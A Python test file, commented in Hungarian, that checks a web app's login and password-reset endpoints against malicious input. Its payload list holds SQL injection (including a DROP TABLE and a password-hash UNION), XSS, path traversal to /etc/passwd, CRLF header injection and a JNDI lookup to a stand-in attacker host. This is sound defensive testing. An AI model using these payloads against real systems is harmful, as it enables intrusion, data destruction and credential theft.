"""150. kör: a belépő mezőibe írt „rosszindulatú” szöveg (SQL-befecskendezés,
script-címke, vezérlő karakterek, típus-trükk) nem léptet be, nem okoz
szerverhibát, nem kerül vissza a válaszba, és nem módosít adatot."""

from __future__ import annotations

import pytest
from sqlalchemy import func, select

from tests.conftest import make_user

PW = "Titkos-Jelszo-99"

PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "admin'--",
    "\" OR \"\"=\"",
    "'; DROP TABLE users; --",
    "' UNION SELECT password_hash FROM users --",
    "valaki@example.com' AND SLEEP(5) --",
    "<script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "{{7*7}}",
    "${jndi:ldap://evil.example/a}",
    "../../../../etc/passwd",
    "%00",
    "a\x00b",
    "árvíztűrő‮tükörfúró",
    "\r\nSet-Cookie: wfm_session=hamis",
    "A" * 320,
]


async def _user_count() -> int:
    from app import db as app_db
    from app.models import User

    async with app_db.get_session_factory()() as s:
        return (await s.execute(select(func.count()).select_from(User))).scalar_one()


@pytest.mark.parametrize("field", ["email", "password"])
async def test_login_fields_reject_injection(client, field):
    await make_user(email="valaki@example.com", role="admin", password=PW)
    before = await _user_count()
    from app.api import auth as auth_mod

    for p in PAYLOADS:
        client.cookies.clear()
        auth_mod._failed_logins.clear()  # a próbálkozás-fék ne takarja el a tesztet
        body = {"email": "valaki@example.com", "password": PW}
        body[field] = p[:128] if field == "password" else p
        res = await client.post("/api/auth/login", json=body)
        # soha nem siker és soha nem szerverhiba
        assert res.status_code in (401, 422), (p, res.status_code, res.text[:200])
        assert not res.cookies, p
        # a beírt szöveg nem kerül vissza a válaszba (nincs mit „lefuttatni”)
        if res.status_code == 401:
            assert res.json() == {"detail": {"code": "auth.bad_credentials"}}
        assert "<script>" not in res.text and "onerror" not in res.text
    # az adat érintetlen, és a jó jelszó (a fék lejárta után) továbbra is jó
    assert await _user_count() == before
    auth_mod._failed_logins.clear()
    client.cookies.clear()
    res = await client.post("/api/auth/login", json={"email": "valaki@example.com", "password": PW})
    assert res.status_code == 200 and res.json()["email"] == "valaki@example.com"


async def test_login_type_confusion_and_other_auth_fields(client):
    await make_user(email="masvalaki@example.com", role="admin", password=PW)
    # szöveg helyett objektum / lista / szám / null — érvényesítési hiba, nem 500
    for bad in ({"$ne": ""}, ["a"], 1, None, True):
        for field in ("email", "password"):
            body = {"email": "masvalaki@example.com", "password": PW}
            body[field] = bad
            res = await client.post("/api/auth/login", json=body)
            assert res.status_code == 422, (field, bad, res.status_code)
    # nem JSON törzs, üres törzs
    res = await client.post("/api/auth/login", content="email=a&password=b",
                            headers={"Content-Type": "application/x-www-form-urlencoded"})
    assert res.status_code == 422
    assert (await client.post("/api/auth/login", content="")).status_code == 422

    # a kód-lépés és az elfelejtett jelszó mezői
    for p in PAYLOADS[:8]:
        res = await client.post("/api/auth/login/verify", json={"challenge_id": (p + "xxxxxxxx")[:64], "code": p[:12] or "0000"})
        assert res.status_code in (401, 422, 429), (p, res.status_code)
        res = await client.post("/api/auth/login/resend", json={"challenge_id": (p + "xxxxxxxx")[:64]})
        assert res.status_code in (401, 422, 429), (p, res.status_code)
        res = await client.post("/api/auth/forgot", json={"email": p[:320]})
        assert res.status_code in (200, 422, 429), (p, res.status_code)
        assert "<script>" not in res.text
